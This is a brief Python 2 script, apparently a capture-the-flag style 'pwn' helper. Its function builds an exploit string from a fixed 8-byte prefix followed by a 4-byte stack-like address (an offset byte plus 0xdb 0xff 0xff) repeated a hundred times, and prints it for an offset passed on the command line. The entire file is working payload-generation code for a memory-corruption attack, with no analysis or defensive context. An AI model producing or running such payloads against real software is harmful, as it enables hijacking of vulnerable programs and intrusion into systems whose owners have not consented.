import sys
def get_pwn_str(offset):
	return chr(98)+chr(94)+chr(95)+chr(107)+chr(29)+chr(59)+chr(30)+chr(117) + (chr(offset)+chr(0xdb)+chr(0xff)+chr(0xff))*100

if __name__ == '__main__':
	print get_pwn_str(int(sys.argv[1]))

